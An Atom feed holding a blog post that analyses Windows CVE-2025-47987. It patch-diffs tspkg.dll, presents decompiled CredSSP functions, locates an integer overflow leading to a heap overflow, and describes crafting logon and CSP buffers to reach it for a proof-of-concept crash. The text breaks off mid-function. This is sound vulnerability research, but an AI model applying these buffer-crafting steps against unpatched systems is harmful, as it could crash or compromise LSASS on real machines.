<?xml version='1.0' encoding='utf-8'?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <id>https://localhost:5173/blog/</id>
  <title><![CDATA[Kryptoenix]]></title>
  <subtitle><![CDATA[blog]]></subtitle>
  <icon>https://localhost:5173/blog/favicon.png</icon>
  <link href="https://localhost:5173/blog" />
  <link href="https://localhost:5173/blog/atom.xml" rel="self" type="application/atom+xml" />
  <updated>2025-08-28T17:21:36.526Z</updated>
  <author>
    <name><![CDATA[Kryptoenix]]></name>
  </author>
  <category term="CVE-2025-47987" scheme="https://localhost:5173/blog/?tags=CVE-2025-47987" />
  <category term="Reverse Engineering" scheme="https://localhost:5173/blog/?tags=Reverse%20Engineering" />
  <category term="Windows" scheme="https://localhost:5173/blog/?tags=Windows" />
  <category term="Malware Analysis" scheme="https://localhost:5173/blog/?tags=Malware%20Analysis" />
  <category term="XWorm" scheme="https://localhost:5173/blog/?tags=XWorm" />
  <entry>
    <title type="html"><![CDATA[Demystifying CVE-2025-47987]]></title>
    <link href="https://localhost:5173/blog/blog/demystifying-CVE-2025-47987" />
    <id>https://localhost:5173/blog/blog/demystifying-CVE-2025-47987</id>
    <published>2025-07-10T00:00:00.000Z</published>
    <updated>2025-07-10T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<p data-svelte-h="svelte-1cf6xwb">Hello reader, this blog post will be about a vulnerability in Windows which was publicly announced last month as part of the  July 8th patch update. The vulnerable component is part of the client authentication mechanism. To begin, let’s take a high-level look at how this component works.</p> <h2 id="client-authentication-architecture" data-svelte-h="svelte-daz9pc"><a href="#client-authentication-architecture">Client Authentication Architecture</a></h2> <p data-svelte-h="svelte-1ivkzmk">In Windows, the authentication happens in 2 layers, user-mode and kernel-mode.</p> <div class="overflow-x-auto mb-4"><table class="table w-full"><thead data-svelte-h="svelte-1wvqf93"><tr><th><strong><em>User-mode</em></strong></th> <th><strong><em>Kernel-mode</em></strong></th></tr></thead> <tbody data-svelte-h="svelte-1f0pijk"><tr><td>The <strong>Local Security Authority</strong> (LSA/lsass.exe) is a user-mode process that acts as a security policy enforcer. It receives credentials from Winlogon or Credential Provider, packages them and sends them to the appropriate authentication package(e.g Kerberos, NTLM) in kernel-mode. It also ensures that the credential format is correct before passing it down.</td> <td>In kernel, credentials are validated by the Kerberos, NTLM or other authentication providers. The actual validation (e.g. ticket generation, password hashing) is done here.</td></tr></tbody></table></div> <p><picture><source srcset="/blog/_app/immutable/assets/authn_lsa_architecture_client.DU47lAom.avif 736w" type="image/avif"> <img alt="/demystifying-CVE-2025-47987/authn_lsa_architecture_client.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="/demystifying-CVE-2025-47987/authn_lsa_architecture_client.png"></picture></p> <p data-svelte-h="svelte-7tfvlj">The <strong>CredSSP</strong> protocol is part of this authentication architecture and allows applications to securely delegate user credentials from a client to a server for remote authentication.For example, RDP protocol uses <strong>CredSSP</strong> protocol for preparing the client-supplied credentials when authenticating to a server, as seen in the image below (first stage). This aspect of the authentication flow will be important when discussing the vulnerability details.</p> <p><picture><source srcset="/blog/_app/immutable/assets/credssp_rdp.jqnvWuA6.avif 736w" type="image/avif"> <img alt="/demystifying-CVE-2025-47987/credssp_rdp.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="/demystifying-CVE-2025-47987/credssp_rdp.png"></picture></p> <h2 id="root-cause" data-svelte-h="svelte-c8o2ov"><a href="#root-cause">Root Cause</a></h2> <p data-svelte-h="svelte-17i75gr">According to <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987%E2%80%8B" rel="nofollow noopener noreferrer external" target="_blank">Microsoft update website</a>, the vulnerability results from a chain of 2 bugs:</p> <ul data-svelte-h="svelte-vkq1gg"><li>Integer overflow</li> <li>Heap-based buffer overflow</li></ul> <p data-svelte-h="svelte-90nf04">Microsoft also mentions that the weakness resides in a component which is part of the CredSSP protocol. Through patch diffing technique, an interesting finding was observed in the <code>tspkg.dll</code> driver. The full module name is <strong>Terminal Services Security Package</strong> and it implements the <strong>TS(Terminal Services)</strong> authentication protocol, which is used for RDP authentication.This driver is a suitable candidate for this CVE because it is used to prepare the RDP credentials before sending them to the server.</p> <div class="alert flex-col shadow-inner my-4  alert-info"><div class="mr-auto flex items-center space-x-3"> <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-24 h-24 text-black-500"><path stroke-linecap="round" stroke-linejoin="round" d="M11.25 9h.008v.008H11.25V9zm.75 4.5v3.75m0-12a9 9 0 100 18 9 9 0 000-18z"></path></svg> <div><div class="font-bold">Tip</div> <div class="text-xs">Usually, a faster route to identify the vulnerable driver is by extracting the drivers associated with the patch update (KB number), but recently, Microsoft changed the update file format and the extraction of its associated system files became harder.</div></div></div> </div> <p data-svelte-h="svelte-1lvm5qv">This is the interesting function:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'>int64_t __fastcall TSCreateKerbCertLogonBuffer(</div><div class='line dim'>    UNICODE_STRING *password,</div><div class='line dim'>    UNICODE_STRING *domain,</div><div class='line dim'>    UNICODE_STRING *username,</div><div class='line dim'>    unsigned char *a4,</div><div class='line dim'>    size_t certLen,</div><div class='line dim'>    unsigned char **a6,</div><div class='line dim'>    unsigned int *a7)</div><div class='line dim'>&#123;</div><div class='line dim'>    unsigned int totalLength;</div><div class='line dim'>    unsigned int alignedTotalLength;</div><div class='line dim'>    unsigned int __totalLength;</div><div class='line dim'>    unsigned int _Size;</div><div class='line dim'>    size_t _totalLength;</div><div class='line dim'>    ... // other variables declaration</div><div class='line'></div><div class='line dim'>    // Initial setup</div><div class='line dim'>    src = a4;</div><div class='line dim'>    totalLength = (domain-&gt;Length + password-&gt;Length + username-&gt;Length + 93) & 0xFFFFFFF8;</div><div class='line dim'>    _totalLength = totalLength;</div><div class='line'></div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    _Size = certLen;</div><div class='line'></div><div class='line dim'>    // Feature flag check</div><div class='line highlight'>    if (isEnabled)</div><div class='line highlight'>    &#123;</div><div class='line highlight'>        status = RtlULongAdd(totalLength, certLen, (unsigned int *)&_totalLength);</div><div class='line highlight'>        if (status &lt; 0)</div><div class='line highlight'>            return (unsigned int)status;</div><div class='line'></div><div class='line highlight'>        __totalLength = (unsigned int)_totalLength;</div><div class='line highlight'>    &#125;</div><div class='line dim'>    else</div><div class='line dim'>    &#123;</div><div class='line dim'>        __totalLength = totalLength + certLen;</div><div class='line dim'>    &#125;</div><div class='line'></div><div class='line dim'>    // Allocate memory for the buffer</div><div class='line dim'>    buff = TSAllocate(__totalLength);</div><div class='line dim'>    _buff = buff;</div><div class='line'></div><div class='line dim'>    if (!buff)</div><div class='line dim'>        return 0xC000009A;   // STATUS_INSUFFICIENT_RESOURCES</div><div class='line'></div><div class='line dim'>    // Fill in header</div><div class='line dim'>    *(DWORD *)buff = 13;</div><div class='line'></div><div class='line dim'>    currentPtr   = buff + 80;</div><div class='line dim'>    passwordBuf  = (void *)(buff + 80);</div><div class='line'></div><div class='line dim'>    // Password</div><div class='line dim'>    *(WORD *)(buff + 40) = password-&gt;Length;</div><div class='line dim'>    length = password-&gt;Length;</div><div class='line dim'>    *(QWORD *)(_buff + 48) = 80LL;</div><div class='line dim'>    *(WORD *)(_buff + 42) = length + 2;</div><div class='line dim'>    memcpy_0(passwordBuf, password-&gt;Buffer, password-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Domain</div><div class='line dim'>    domainBuf = (char *)(*(unsigned short *)(_buff + 42) + currentPtr);</div><div class='line dim'>    *(WORD *)(_buff + 8) = domain-&gt;Length;</div><div class='line dim'>    *(WORD *)(_buff + 10) = domain-&gt;Length + 2;</div><div class='line dim'>    *(QWORD *)(_buff + 16) = &domainBuf[-_buff];</div><div class='line dim'>    memcpy_0(domainBuf, domain-&gt;Buffer, domain-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Username</div><div class='line dim'>    usernameBuf = &domainBuf[*(unsigned short *)(_buff + 10)];</div><div class='line dim'>    *(WORD *)(_buff + 24) = username-&gt;Length;</div><div class='line dim'>    *(WORD *)(_buff + 26) = username-&gt;Length + 2;</div><div class='line dim'>    *(QWORD *)(_buff + 32) = &usernameBuf[-_buff];</div><div class='line dim'>    memcpy_0(usernameBuf, username-&gt;Buffer, username-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Certificate</div><div class='line dim'>    certBuf = (char *)(</div><div class='line dim'>        (unsigned int64_t)&usernameBuf[*(unsigned short *)(_buff + 26) + 7]</div><div class='line dim'>        & 0xFFFFFFFFFFFFFFF8ULL</div><div class='line dim'>    );</div><div class='line dim'>    *(DWORD *)(_buff + 60) = _Size;</div><div class='line dim'>    *(QWORD *)(_buff + 64) = &certBuf[-_buff];</div><div class='line dim'>    memcpy_0(certBuf, src, _Size);</div><div class='line'></div><div class='line dim'>    // Output</div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    return status;</div><div class='line dim'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-qoeirs">The highlighted section shows the patched code. The use of the <code>RtlULongAdd</code> function strongly suggests that the original, vulnerable version was susceptible to integer overflow. Later in the function, the result of this calculation, potentially overflowed, is used to allocate a heap object and perform copy operations, which could lead to buffer overflow. It is safe to assume that this is the vulnerable function since it matches the MS description for CVE-2025-47987.</p> <h2 id="building-a-poc-crash" data-svelte-h="svelte-1y92owq"><a href="#building-a-poc-crash">Building a PoC Crash</a></h2> <p data-svelte-h="svelte-akc3jh">In order to identify the entry point into the <code>tspkg.dll</code> driver, a good approach is to start from the vulnerable function and trace back the function from which it was called. Then, repeat the same step up until the entry function is reached inside the driver. This is the list of functions which are the most relevant for the vulnerability:</p> <ul data-svelte-h="svelte-1rmq3os"><li><code>SpAcquireCredentialsHandle</code> <ul><li><code>TSCaptureSuppliedCreds</code></li> <li><code>TSUnpackKerbCertLogonBuffer</code> <ul><li><code>TSInitCertCreds</code> <ul><li><code>TSGetCspDetailFromCspData</code> <ul><li><code>TSRelocateCspString</code></li></ul></li> <li><strong>TSCreateKerbCertLogonBuffer</strong></li></ul></li></ul></li></ul></li></ul> <p data-svelte-h="svelte-1sg7tlg">When the PoC binary calls the <code>AcquireCredentialsHandle</code> WinAPI function, the SSPI module forwards the request to the <code>lsass.exe</code> process. <code>lsass.exe</code> then routes the request to the appropriate security package driver—in this case, <code>tspkg.dll</code>—where the <code>SpAcquireCredentialsHandle</code> function is invoked. The credential flow for a RDP connection where <code>tspkg.dll</code> is invoked can be seen in the image below.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>RDP Client</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>Terminal Services Service (calls SSPI with "TSSSP")</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>SSPI "TSSSP" package (user mode)</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>Communicates with LSASS process</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>LSASS dispatches to LSA package "tspkg.dll" (SpAcquireCredentialsHandle)</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>&#96;tspkg.dll&#96; handles credentials inside LSASS (SYSTEM)</div><div class='line'>    |</div><div class='line'>    v</div><div class='line'>RDP session proceeds</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-nfgyqs">The Poc binary calls <code>AcquireCredentialsHandle</code> with the following parameters:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'>AcquireCredentialHandleW(</div><div class='line'>    NULL,</div><div class='line'>    (LPWSTR)L"TSSSP",   // pszPackage (name of the security package)</div><div class='line'>    SECPKG_CRED_OUTBOUND,</div><div class='line'>    NULL,</div><div class='line'>    buf,                // pAuthData (pointer to authentication data)</div><div class='line'>    NULL,</div><div class='line'>    NULL,</div><div class='line'>    &credHandle,</div><div class='line'>    &expiry</div><div class='line'>);</div></code></div></pre><!-- HTML_TAG_END --> <h3 id="reaching-tsinitcertcreds" data-svelte-h="svelte-16zgcb2"><a href="#reaching-tsinitcertcreds">Reaching TSInitCertCreds()</a></h3> <p data-svelte-h="svelte-1mrsvoo">Inside <code>tspkg.dll</code>, <code>SpAcquireCredentialsHandle</code> function will call <code>TSCaptureSuppliedCreds</code> without any restrictions for the user-supplied buffer. When trying to reach <code>TSInitCertCreds</code>, there are some validations to ensure that the credential buffer received follows a required format.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'>int64_t __fastcall TSCaptureSuppliedCreds(</div><div class='line dim'>    LUID *a1,</div><div class='line dim'>    void *a2,</div><div class='line dim'>    TS_PRIMARY_CREDENTIAL **a3,</div><div class='line dim'>    unsigned int *a4)</div><div class='line dim'>&#123;</div><div class='line dim'>    ... // Variables definition</div><div class='line'></div><div class='line dim'>    // Get LSA call info</div><div class='line dim'>    ((void (__fastcall *)(char *))TSGlobalLsaFunctions-&gt;GetCallInfo)(v30);</div><div class='line dim'>    v9 = v30[8];</div><div class='line dim'>    *a3 = 0;</div><div class='line'></div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    // Copy logon type</div><div class='line dim'>    status = ((int64_t (__fastcall *)(QWORD, int64_t, int *, void *))</div><div class='line dim'>            TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line dim'>                0LL, 4LL, &_type, v8);</div><div class='line dim'>    ... // Exit on error</div><div class='line'></div><div class='line dim'>    type = _type;</div><div class='line'></div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    v12 = v9 & 0x40;</div><div class='line'></div><div class='line dim'>    // Handle logon types</div><div class='line dim'>    if (type == 2)</div><div class='line dim'>    &#123;</div><div class='line dim'>        // Unpack kerberos password logon buffer</div><div class='line dim'>        ...</div><div class='line dim'>    &#125;</div><div class='line dim'>    else if (type == 0xD)</div><div class='line dim'>    &#123;</div><div class='line dim'>        // Unpack kerberos certificate logon buffer</div><div class='line highlight'>        v16 = TSUnpackKerbCertLogonBuffer(</div><div class='line highlight'>            v12 != 0,</div><div class='line highlight'>            (char *)v8,</div><div class='line highlight'>            &username,</div><div class='line highlight'>            &domain,</div><div class='line highlight'>            &password,</div><div class='line highlight'>            &certData,</div><div class='line highlight'>            &certLen,</div><div class='line highlight'>            &v22,</div><div class='line highlight'>            &v34);</div><div class='line'></div><div class='line dim'>        _certData = certData;</div><div class='line dim'>        ... // Cleanup on error</div><div class='line dim'>        _certLen = certLen;</div><div class='line dim'>        goto LABEL_14;</div><div class='line dim'>    &#125;</div><div class='line dim'>    else</div><div class='line dim'>    &#123;</div><div class='line dim'>        // Unpack auth ID logon buffer</div><div class='line dim'>        ...</div><div class='line'></div><div class='line dim'>LABEL_14:</div><div class='line dim'>    // Decode password secret if available</div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>LABEL_19:</div><div class='line dim'>    ... // Certificate check in Certificate Store (not relevant)</div><div class='line'></div><div class='line dim'>    if (pCertContext || _certLen)</div><div class='line dim'>    &#123;</div><div class='line highlight'>        status = TSInitCertCreds(</div><div class='line highlight'>            pCertContext,</div><div class='line highlight'>            &username,</div><div class='line highlight'>            &password,</div><div class='line highlight'>            &domain,</div><div class='line highlight'>            _certData,</div><div class='line highlight'>            _certLen,</div><div class='line highlight'>            a3);</div><div class='line'></div><div class='line dim'>LABEL_30:</div><div class='line dim'>        .. // Cleanup</div><div class='line dim'>        goto LABEL_32;</div><div class='line dim'>    &#125;</div><div class='line'></div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>LABEL_32:</div><div class='line dim'>    // Cleanup on failure</div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    return status;</div><div class='line dim'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1o125ol">In the second highlighted section, the code calls <code>TsInitCertCreds</code>. To reach this call, one of two conditions must be met:</p> <ul data-svelte-h="svelte-1vjqtxi"><li>A valid certificate is found in the Microsoft certificate store for the specified user, <strong>or</strong></li> <li>Custom certificate data is provided in the <strong>pAuthData user buffer</strong>.</li></ul> <p data-svelte-h="svelte-1lsc69s">The latter approach offers greater flexibility, but the custom data must first pass the validations enforced by <code>TSUnpackKerbCertLogonBuffer</code> before the <code>certData</code> and <code>certLen</code> variables are populated.</p> <h4 id="crafting-a-valid-packed-kerbcertlogonbuffer" data-svelte-h="svelte-12vgnw6"><a href="#crafting-a-valid-packed-kerbcertlogonbuffer">Crafting a valid packed KerbCertLogonBuffer</a></h4> <p data-svelte-h="svelte-si9xav"><code>TSUnpackKerbCertLogonBuffer</code> function is responsible for validating the structure of the logon buffer. Primarly, it expects 3 <code>UNICODE_STRING</code> structures as input, denoted by <strong>username</strong>, <strong>domain name</strong> and <strong>password</strong>, and 2 output arguments for the certificate data (buffer pointer and its size).</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'>int64_t __fastcall TSUnpackKerbCertLogonBuffer(</div><div class='line dim'>        int a1,</div><div class='line dim'>        char *buffer,</div><div class='line dim'>        UNICODE_STRING *__username,</div><div class='line dim'>        UNICODE_STRING *__domain,</div><div class='line dim'>        UNICODE_STRING *__password,</div><div class='line dim'>        unsigned char **cert,</div><div class='line dim'>        unsigned int *certSize,</div><div class='line dim'>        void **a8,</div><div class='line dim'>        unsigned int *a9)</div><div class='line dim'>&#123;</div><div class='line dim'>  ... // Variables declaration and initialization</div><div class='line'></div><div class='line dim'>  if ( a1 )</div><div class='line dim'>  &#123;</div><div class='line dim'>    ...</div><div class='line dim'>  &#125;</div><div class='line dim'>  else</div><div class='line dim'>  &#123;</div><div class='line dim'>    status = ((int64_t (__fastcall *)(QWORD, int64_t, int *, char *))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line dim'>            0LL,</div><div class='line dim'>            72LL,</div><div class='line dim'>            &v31,</div><div class='line dim'>            buffer);</div><div class='line dim'>    if ( status &lt; 0 )</div><div class='line dim'>      return status;</div><div class='line dim'>    v14 = cert_len;</div><div class='line dim'>    domainLen = domain.Length;</div><div class='line dim'>    passwordLen = password.Length;</div><div class='line dim'>    usernameLen = username.Length;</div><div class='line dim'>  &#125;</div><div class='line highlight'>  if ( (username.Length & 1) != 0 || (domain.Length & 1) != 0 || (password.Length & 1) != 0 )// check unicode length</div><div class='line highlight'>  &#123;</div><div class='line highlight'>    return 0xC000000D;</div><div class='line highlight'>  &#125;</div><div class='line dim'>  else</div><div class='line dim'>  &#123;</div><div class='line dim'>    v18 = v14 + ((domainLen + passwordLen + usernameLen + 7) & 0xFFFFFFF8);</div><div class='line dim'>    if ( v18 &lt; v14 )</div><div class='line dim'>    &#123;</div><div class='line dim'>      return 0xC0000095;</div><div class='line dim'>    &#125;</div><div class='line dim'>    else</div><div class='line dim'>    &#123;</div><div class='line dim'>      v19 = v14 + ((domainLen + passwordLen + usernameLen + 7) & 0xFFFFFFF8);</div><div class='line dim'>      copy_username_buf = (char *)TSAllocate(v18);</div><div class='line dim'>      if ( copy_username_buf )</div><div class='line dim'>      &#123;</div><div class='line highlight'>        status = ((int64_t (__fastcall *)(QWORD, QWORD, char *, char *))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line highlight'>                0LL,</div><div class='line highlight'>                username.Length,</div><div class='line highlight'>                copy_username_buf,</div><div class='line highlight'>                &buffer[username.Buffer]);</div><div class='line dim'>        v21 = v19;</div><div class='line dim'>        if ( status &lt; 0 )</div><div class='line dim'>          goto LABEL_17;</div><div class='line dim'>        username.MaximumLength = username.Length;</div><div class='line dim'>        copy_password_buf = &copy_username_buf[username.Length];</div><div class='line dim'>        username.Buffer = (UINT64)copy_username_buf;</div><div class='line highlight'>        status = ((int64_t (__fastcall *)(QWORD, QWORD, char *, char *))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line highlight'>                0LL,</div><div class='line highlight'>                password.Length,</div><div class='line highlight'>                copy_password_buf,</div><div class='line highlight'>                &buffer[password.Buffer]);</div><div class='line dim'>        v21 = v19;</div><div class='line dim'>        if ( status &lt; 0 )</div><div class='line dim'>          goto LABEL_17;</div><div class='line dim'>        password.Buffer = (UINT64)copy_password_buf;</div><div class='line dim'>        copy_domain_buf = &copy_password_buf[password.Length];</div><div class='line dim'>        password.MaximumLength = password.Length;</div><div class='line highlight'>        status = ((int64_t (__fastcall *)(QWORD, QWORD, char *, char *))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line highlight'>                0LL,</div><div class='line highlight'>                domain.Length,</div><div class='line highlight'>                copy_domain_buf,</div><div class='line highlight'>                &buffer[domain.Buffer]);</div><div class='line dim'>        v21 = v19;</div><div class='line highlight'>        if ( status &lt; 0</div><div class='line highlight'>          || (domain.MaximumLength = domain.Length,</div><div class='line highlight'>              domain.Buffer = (UINT64)copy_domain_buf,</div><div class='line highlight'>              copy_cert_buf = (unsigned int64_t)&copy_domain_buf[domain.Length + 7] & 0xFFFFFFFFFFFFFFF8uLL,</div><div class='line highlight'>              status = ((int64_t (__fastcall *)(QWORD, QWORD, unsigned int64_t, char *))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</div><div class='line highlight'>                      0LL,</div><div class='line highlight'>                      cert_len,</div><div class='line highlight'>                      copy_cert_buf,</div><div class='line highlight'>                      &buffer[cert_offset]),</div><div class='line highlight'>              v21 = v19,</div><div class='line highlight'>              v13 &lt; 0) )</div><div class='line dim'>        &#123;</div><div class='line dim'>LABEL_17:</div><div class='line dim'>          ... // Cleanup</div><div class='line dim'>        &#125;</div><div class='line dim'>        else</div><div class='line dim'>        &#123;</div><div class='line dim'>          ... // Variable assignments</div><div class='line dim'>        &#125;</div><div class='line dim'>      &#125;</div><div class='line dim'>      else</div><div class='line dim'>      &#123;</div><div class='line dim'>        return 0xC000009A;</div><div class='line dim'>      &#125;</div><div class='line dim'>    &#125;</div><div class='line dim'>  &#125;</div><div class='line dim'>  return status;</div><div class='line dim'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1rg88rb">The <strong>Unicode string check</strong> ensures that the buffers’ data must contain an even number of bytes. Subsequent calls to the <code>CopyFromClientBuffer</code> LSA function will copy data from a Unicode structure buffer at a specific offset within the <code>pAuthData</code> buffer. This operation overwrites the original offset with a pointer to a buffer that contains the copied data. Overall, the logon buffer format should look like this:</p> <img src="buffer_format.png" width="500"> <h3 id="reaching-the-vulnerable-function" data-svelte-h="svelte-15pdpew"><a href="#reaching-the-vulnerable-function">Reaching the vulnerable function</a></h3> <p data-svelte-h="svelte-bpct6a">Now, that a valid buffer is constructed, <code>TsInitCertCred</code> is called, and a new set of validations is performed.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'>int64_t __fastcall TSInitCertCreds(</div><div class='line dim'>        PCCERT_CONTEXT pCert,</div><div class='line dim'>        UNICODE_STRING *username,</div><div class='line dim'>        UNICODE_STRING *password,</div><div class='line dim'>        UNICODE_STRING *domain,</div><div class='line dim'>        unsigned int *certData,</div><div class='line dim'>        unsigned int certLen,</div><div class='line dim'>        TS_PRIMARY_CREDENTIAL **a7)</div><div class='line dim'>&#123;</div><div class='line dim'>  unsigned int _certLen;</div><div class='line dim'>  size_t __certLen;</div><div class='line dim'>  ... // Other variables declaration</div><div class='line'></div><div class='line dim'>  status = TSGlobalLsaFunctions-&gt;ImpersonateClient();</div><div class='line dim'>  if ( status &gt;= 0 )</div><div class='line dim'>  &#123;</div><div class='line dim'>    v12 = (char *)TSAllocate(0xE8uLL);</div><div class='line dim'>    ...</div><div class='line dim'>    v14 = certData;</div><div class='line highlight'>    if ( certData && (_certLen = certLen) != 0 )</div><div class='line dim'>    &#123;</div><div class='line dim'>      status = TSGetCspDetailFromCspData(certLen, certData, (TS_CSPDATA_DETAIL *)(v12 + 0x50));</div><div class='line dim'>      ... // Cleanup on error</div><div class='line dim'>    &#125;</div><div class='line'></div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    status = TSDuplicateStringEx((UNICODE_STRING *)(v13 + 24), username, v16);</div><div class='line dim'>    if ( status &gt;= 0 )</div><div class='line dim'>    &#123;</div><div class='line dim'>      status = TSDuplicateStringEx((UNICODE_STRING *)(v13 + 8), domain, v19);</div><div class='line dim'>      if ( status &gt;= 0 )</div><div class='line dim'>      &#123;</div><div class='line dim'>        status = TSDuplicatePassword((UNICODE_STRING *)(v13 + 40), password);</div><div class='line dim'>        if ( status &gt;= 0 )</div><div class='line dim'>        &#123;</div><div class='line dim'>          LODWORD(__certLen) = _certLen;</div><div class='line highlight'>          status = TSCreateKerbCertLogonBuffer(</div><div class='line highlight'>                     (UNICODE_STRING *)(v13 + 40),</div><div class='line highlight'>                     (UNICODE_STRING *)(v13 + 8),</div><div class='line highlight'>                     (UNICODE_STRING *)(v13 + 24),</div><div class='line highlight'>                     v14,</div><div class='line highlight'>                     __certLen,</div><div class='line highlight'>                     (unsigned char **)v13 + 19,</div><div class='line highlight'>                     (unsigned int *)v13 + 40);</div><div class='line dim'>          ... // Cleanup on error</div><div class='line dim'>        &#125;</div><div class='line dim'>      &#125;</div><div class='line dim'>    &#125;</div><div class='line dim'>    goto LABEL_7;</div><div class='line dim'>  &#125;</div><div class='line dim'>LABEL_9:</div><div class='line dim'>  ... // Cleanup</div><div class='line dim'>  return status;</div><div class='line dim'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1ey2e5d">These validations ensure that the certificate data adheres to the Windows-specific certificate format known as <strong>CSP (Cryptographic Service Provider)</strong>. This format is composed of two parts: a <strong>header</strong> and a <strong>body</strong>(CSP data). In this context, <strong>CSP data</strong> refers to the information within the certificate that identifies and links it to its corresponding private key provider.</p> <h4 id="crafting-a-valid-csp-buffer" data-svelte-h="svelte-stf7wl"><a href="#crafting-a-valid-csp-buffer">Crafting a valid CSP buffer</a></h4> <p data-svelte-h="svelte-1m0i1ox">The <code>TSGetCspDetailFromCspData</code> function first verifies that the CSP buffer is at least 0x30 bytes in size, 0x28 bytes for the header(10 DWORDs) + 1 padding DWORD + 1 <strong>Data Area</strong> DWORD.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'>int64_t __fastcall TSGetCspDetailFromCspData(</div><div class='line'>        unsigned int certLen,</div><div class='line'>        unsigned char *certData,</div><div class='line'>        TS_CSPDATA_DETAIL *a3)</div><div class='line'>&#123;</div><div class='line'>  ... // Variables declaration</div><div class='line'></div><div class='line'>  if ( !certData || certLen &lt; 0x30 || !a3 )</div><div class='line'>    return 0xC000000DLL;</div><div class='line'>  memset_0(a3, 0, 0x48uLL);</div><div class='line'>  status = TSRelocateCspString(*((DWORD *)certData + 6), (char *)certData, certLen, &v13, 1);</div><div class='line'>  if ( status &gt;= 0 )</div><div class='line'>  &#123;</div><div class='line'>    status = TSRelocateCspString(*((DWORD *)certData + 7), (char *)certData, certLen, &v10, 1);</div><div class='line'>    if ( status &gt;= 0 )</div><div class='line'>    &#123;</div><div class='line'>      status = TSRelocateCspString(*((DWORD *)certData + 8), (char *)certData, certLen, &v11, 0);</div><div class='line'>      if ( status &gt;= 0 )</div><div class='line'>      &#123;</div><div class='line'>        _status = TSRelocateCspString(*((DWORD *)certData + 9), (char *)certData, certLen, &v12, 0);</div><div class='line'>        v3 = v12;</div><div class='line'>        status = _status;</div><div class='line'>        if ( _status &gt;= 0 )</div><div class='line'>          status = TSBuildCspDetail(v13, v10, v11, v12, *((DWORD *)certData + 5), a3);</div><div class='line'>      &#125;</div><div class='line'>    &#125;</div><div class='line'>  &#125;</div><div class='line'>  ... // Cleanup</div><div class='line'>  return status;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-fcmeo0">After this initial check, the function delegates further validation to <code>TSRelocateCspString</code>. This includes:</p> <ul data-svelte-h="svelte-oa9hdf"><li>Checking the <strong>providerName</strong> value (located at <strong>header[5]</strong>).</li> <li>Validating the offset from which the string starts within the <strong>Data Area</strong> (located at <strong>header[6]</strong>).</li></ul> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'>int64_t __fastcall TSRelocateCspString(</div><div class='line'>        int a1,               // Offset into the input buffer</div><div class='line'>        char *a2,             // Pointer to a buffer (CSP blob)</div><div class='line'>        unsigned int a3,      // Total size of that buffer</div><div class='line'>        unsigned short **a4,  // [out] Receives pointer to newly allocated wide string</div><div class='line'>        int a5)               // Flag</div><div class='line'>&#123;</div><div class='line'>  ... // Variables declaration</div><div class='line'></div><div class='line'>  v5 = 0;</div><div class='line'>  if ( !a4 || !a2 || a3 &lt; 0x30 )</div><div class='line'>    return 0xC000000DLL;</div><div class='line'>  *a4 = 0LL;</div><div class='line'>  if ( !a1 && a5 )</div><div class='line'>    return 0LL;</div><div class='line'>  v8 = 2 * a1;    // Offset in bytes</div><div class='line'>  v9 = a2 + 40;   // Data/String area</div><div class='line'>  v10 = a3 - 40;</div><div class='line'>  if ( v8 &gt;= v10 )</div><div class='line'>    return 0xC000000DLL;</div><div class='line'>  v11 = &v9[v8];</div><div class='line'>  v12 = &v9[v10];</div><div class='line'>  v13 = v11;</div><div class='line'>  if ( v11 &gt;= v12 )</div><div class='line'>    return 0xC000000DLL;</div><div class='line'>  while ( 1 )</div><div class='line'>  &#123;</div><div class='line'>    v14 = *v13;</div><div class='line'>    v5 += 2;</div><div 